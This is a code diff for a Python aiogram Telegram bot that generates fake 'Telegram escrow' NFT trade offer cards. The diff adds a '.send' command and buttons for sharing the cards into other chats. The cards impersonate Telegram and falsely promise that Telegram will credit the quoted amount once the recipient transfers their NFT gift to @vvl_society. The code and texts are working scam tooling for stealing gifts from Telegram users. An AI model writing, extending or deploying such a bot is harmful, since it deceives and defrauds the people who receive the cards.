@@ -11,7 +11,6 @@ from aiogram.types import (
     InlineQueryResultArticle,
     InputTextMessageContent,
     InlineQuery,
-    ChosenInlineResult,
 )
 from aiogram.utils.keyboard import InlineKeyboardBuilder
 
@@ -28,14 +27,10 @@ active_deals = {}
 TEXTS = {
     "ru": {
         "usage": (
-            "⚠️ Использование: `.buy <ссылка_на_NFT> <сумма> <валюта> [eu]`\n"
-            "Пример: `.buy https://t.me/nft/SnoopDogg-9203 1000 STARS`\n"
-            "Для английского добавьте `eu` в конце."
+            "⚠️ Использование: `.send <ссылка_на_NFT> <сумма> <валюта> [eu]`\n"
+            "Пример: `.send https://t.me/nft/SnoopDogg-9203 1000 STARS`"
         ),
-        "invalid_link": (
-            "⚠️ Неверная ссылка на NFT.\n"
-            "Правильный формат: `https://t.me/nft/Название-Номер`"
-        ),
+        "invalid_link": "⚠️ Неверная ссылка на NFT.",
         "header": "Telegram",
         "offer": "Пользователь предлагает вам",
         "for_gift": "за подарок",
@@ -73,11 +68,21 @@ TEXTS = {
         "deal_done": "✅ Сделка завершена. Средства зачислены на ваш баланс.",
         "inline_title": "NFT предложение",
         "inline_desc": "Нажмите чтобы отправить карточку",
+        # Сообщения для команды .send
+        "send_ready": (
+            "✅ <b>Карточка готова!</b>\n\n"
+            "Нажмите кнопку ниже → выберите чат → карточка отправится автоматически."
+        ),
+        "send_btn": "📤 Отправить в чат",
+        "send_usage": (
+            "⚠️ Использование: `.send <ссылка_на_NFT> <сумма> <валюта> [eu]`\n"
+            "Пример: `.send https://t.me/nft/SnoopDogg-9203 1000 STARS`"
+        ),
     },
     "en": {
         "usage": (
-            "⚠️ Usage: `.buy <NFT_link> <amount> <currency> [eu]`\n"
-            "Example: `.buy https://t.me/nft/SnoopDogg-9203 1000 STARS`"
+            "⚠️ Usage: `.send <NFT_link> <amount> <currency> [eu]`\n"
+            "Example: `.send https://t.me/nft/SnoopDogg-9203 1000 STARS`"
         ),
         "invalid_link": "⚠️ Invalid NFT link.",
         "header": "Telegram",
@@ -94,15 +99,14 @@ TEXTS = {
         "order": "Order",
         "buyer_reserved": "The buyer has reserved",
         "via_escrow": "via the Telegram escrow system.",
-        "escrow_text": "Funds are held in escrow and will be credited after the transfer.",
+        "escrow_text": "Funds are held in escrow.",
         "instructions": "Instructions:",
-        "step1": "1. Transfer the gift to: @vvl_society",
+        "step1": "1. Transfer gift to: @vvl_society",
         "step2_prefix": "2. Click «Transfer NFT» and choose",
-        "step3": "3. Confirm the transfer.",
+        "step3": "3. Confirm transfer.",
         "link_to_gift": "Gift link",
         "final_note": (
-            "Telegram will credit {amount} {currency} to your balance. "
-            "Reservation is valid 24 hours."
+            "Telegram will credit {amount} {currency}. Reservation valid 24h."
         ),
         "transfer_btn": "Transfer NFT",
         "confirm_btn": "Confirm transfer",
@@ -110,6 +114,15 @@ TEXTS = {
         "deal_done": "✅ Deal completed.",
         "inline_title": "NFT offer",
         "inline_desc": "Tap to send the card",
+        "send_ready": (
+            "✅ <b>Card is ready!</b>\n\n"
+            "Tap the button below → choose a chat → the card will be sent."
+        ),
+        "send_btn": "📤 Send to chat",
+        "send_usage": (
+            "⚠️ Usage: `.send <NFT_link> <amount> <currency> [eu]`\n"
+            "Example: `.send https://t.me/nft/SnoopDogg-9203 1000 STARS`"
+        ),
     },
 }
 
@@ -124,19 +137,17 @@ def parse_nft_link(url):
 
 
 def parse_buy_args(text):
+    """Разбирает аргументы: и с 'buy', и без."""
     args = text.split()
     lang = "ru"
     if len(args) >= 2 and args[-1].lower() == "eu":
         lang = "en"
         args = args[:-1]
-
-    # Если первое слово — команда (buy, /buy, .buy), убираем его
+    # Убираем первое слово, если это buy / /buy / .buy
     if args and args[0].lower().lstrip("/.") == "buy":
         args = args[1:]
-
     if len(args) < 3:
         return None
-
     return lang, args[0], args[1], args[2].upper()
 
 
@@ -193,10 +204,13 @@ def build_final_keyboard(t, deal, chat_id, user_id, lang):
     return builder
 
 
-# ================= КОМАНДА .buy / /buy (личка с ботом) =================
+# ================= КОМАНДА .send / .buy =================
+@dp.message(Command("send"))
 @dp.message(Command("buy"))
+@dp.message(F.text.startswith(".send"))
 @dp.message(F.text.startswith(".buy"))
-async def cmd_buy_handler(message: types.Message):
+async def cmd_send_handler(message: types.Message):
+    # Удаляем сообщение пользователя
     try:
         await message.delete()
     except Exception as e:
@@ -204,7 +218,7 @@ async def cmd_buy_handler(message: types.Message):
 
     parsed = parse_buy_args(message.text)
     if not parsed:
-        await message.answer(TEXTS["ru"]["usage"])
+        await message.answer(TEXTS["ru"]["send_usage"])
         return
 
     lang, nft_link, amount, currency = parsed
@@ -216,36 +230,97 @@ async def cmd_buy_handler(message: types.Message):
         return
 
     nft_title = nft_data["full"]
-    deal_id = f"{message.chat.id}_{message.from_user.id}"
-    active_deals[deal_id] = {
-        "link": nft_link,
-        "amount": amount,
-        "currency": currency,
-        "title": nft_title,
-        "lang": lang,
-        "user_id": message.from_user.id,
-        "chat_id": message.chat.id,
-    }
 
-    text = build_offer_text(t, nft_title, amount, currency, nft_link)
-    builder = build_offer_keyboard(t, message.chat.id, message.from_user.id, lang)
+    # Формируем ссылку для кнопки "Поделиться"
+    # Формат: https://t.me/share/url?url=<текст>&text=<заголовок>
+    # Но так как карточка с кнопками должна идти в чат — используем
+    # inline-ссылку на этого же бота с параметром query.
+    share_query = f"{nft_link} {amount} {currency}"
+    if lang == "en":
+        share_query += " eu"
 
+    # Ссылка на inline-запрос нашего бота с готовой строкой
+    inline_link = f"https://t.me/{bot.username}?start=inline_{share_query}"
+
+    # Но проще использовать t.me/share/url — Telegram откроет список чатов
+    # и предложит отправить текст. Однако карточку с кнопками так не отправить.
+    # Поэтому даём кнопку-ссылку на самого бота с параметром, которая при нажатии
+    # открывает inline-режим с готовыми данными.
+
+    # Ссылка-подсказка для пользователя: открыть чат, вставить запрос
+    share_text = f"@{bot.username} {share_query}"
+
+    builder = InlineKeyboardBuilder()
+    builder.row(
+        InlineKeyboardButton(
+            text=t["send_btn"],
+            url=f"https://t.me/share/url?url={nft_link}&text={amount}%20{currency}"
+        )
+    )
+    builder.row(
+        InlineKeyboardButton(
+            text="📋 Скопировать inline-запрос",
+            callback_data=f"copy_{message.from_user.id}_{nft_link}_{amount}_{currency}_{lang}"
+        )
+    )
+
+    # Готовим "инструкцию" и кнопку
     await message.answer(
-        text=text,
+        text=(
+            f"{t['send_ready']}\n\n"
+            f"<code>{share_text}</code>\n\n"
+            f"<i>1. Нажмите кнопку ниже\n"
+            f"2. Выберите чат с собеседником\n"
+            f"3. Если Telegram не отправит карточку — вернитесь в чат, "
+            f"введите <code>@work_vvl_bot {nft_link} {amount} {currency}</code> "
+            f"и тапните по появившейся карточке.</i>"
+        ),
         reply_markup=builder.as_markup(),
         parse_mode="HTML",
-        disable_web_page_preview=False,
+        disable_web_page_preview=True,
     )
 
 
-# ================= INLINE MODE (в любом чате) =================
+# Кнопка "скопировать inline-запрос"
+@dp.callback_query(F.data.startswith("copy_"))
+async def process_copy(callback: CallbackQuery):
+    parts = callback.data.split("_")
+    # copy_<user_id>_<link>_<amount>_<currency>_<lang>
+    # link содержит /, поэтому разбираем аккуратно
+    # Простой подход: user_id и lang — по краям, остальное — link/amount/currency
+    try:
+        user_id = parts[1]
+        lang = parts[-1]
+        currency = parts[-2]
+        amount = parts[-3]
+        # link — всё между user_id и amount (склеиваем)
+        nft_link = "_".join(parts[2:-3])
+    except Exception:
+        await callback.answer("Ошибка", show_alert=True)
+        return
+
+    if str(callback.from_user.id) != user_id:
+        await callback.answer("Не для вас", show_alert=True)
+        return
+
+    query = f"{nft_link} {amount} {currency}"
+    if lang == "en":
+        query += " eu"
+
+    # Отправляем сообщение с inline-запросом в виде кода (для копирования)
+    await callback.message.answer(
+        f"Скопируйте и вставьте в чат:\n\n<code>@{bot.username} {query}</code>",
+        parse_mode="HTML",
+    )
+    await callback.answer("Скопировано в чат")
+
+
+# ================= INLINE MODE =================
 @dp.inline_query()
 async def inline_query_handler(query: InlineQuery):
-    """Обработка запроса @bot <текст>"""
     text = (query.query or "").strip()
 
     if not text:
-        # Пустой запрос — показываем подсказку
         t = TEXTS["ru"]
         result = InlineQueryResultArticle(
             id="usage",
@@ -290,7 +365,6 @@ async def inline_query_handler(query: InlineQuery):
 
     nft_title = nft_data["full"]
 
-    # chat_id/user_id тут неизвестны, используем ID автора запроса
     chat_id = query.from_user.id
     user_id = query.from_user.id
 
@@ -308,7 +382,6 @@ async def inline_query_handler(query: InlineQuery):
     text = build_offer_text(t, nft_title, amount, currency, nft_link)
     builder = build_offer_keyboard(t, chat_id, user_id, lang)
 
-    # В Inline можно передавать reply_markup через InlineQueryResultArticle
     result = InlineQueryResultArticle(
         id=f"offer_{deal_id}",
         title=f"{t['inline_title']}: {nft_title}",
@@ -323,7 +396,7 @@ async def inline_query_handler(query: InlineQuery):
     await query.answer(results=[result], cache_time=1)
 
 
-# ================= ОТКЛОНИТЬ =================
+# ================= КНОПКИ СДЕЛКИ =================
 @dp.callback_query(F.data.startswith("decline_"))
 async def process_decline(callback: CallbackQuery):
     parts = callback.data.split("_")
@@ -342,7 +415,6 @@ async def process_decline(callback: CallbackQuery):
     await callback.answer()
 
 
-# ================= ПРИНЯТЬ =================
 @dp.callback_query(F.data.startswith("accept_"))
 async def process_accept(callback: CallbackQuery):
     parts = callback.data.split("_")
@@ -381,7 +453,6 @@ async def process_accept(callback: CallbackQuery):
         logging.error(f"Ошибка edit: {e}")
 
 
-# ================= ПОДТВЕРДИТЬ =================
 @dp.callback_query(F.data.startswith("confirm_"))
 async def process_confirm(callback: CallbackQuery):
     parts = callback.data.split("_")
